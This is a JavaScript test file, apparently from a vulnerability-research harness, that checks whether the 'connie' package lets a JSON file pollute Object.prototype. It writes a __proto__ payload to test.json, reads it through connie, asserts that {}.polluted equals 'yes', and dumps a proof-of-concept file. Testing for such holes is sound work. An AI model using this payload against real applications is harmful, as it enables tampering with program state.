const connie = require("connie")
const fs = require("fs");

var utils = require('../../scripts/utils');


// define a mock setter
let targetCodeLine = undefined;
utils.EnableProtoPollutedMock(x => targetCodeLine = x);

fs.writeFileSync("test.json", `{"__proto__": {"polluted": "yes"}}`);

async function run() {
  expect({}.polluted).toBe(undefined);
  await connie("file", "test.json").read();
  expect({}.polluted).toBe("yes");

  if ({}.polluted == "yes" && targetCodeLine) {
    utils.dumpIfNeeded("connie.PoC.js", targetCodeLine);
  }

  fs.unlinkSync("test.json");
}

test("+: `{}.polluted` should be `yes`", async () => run())
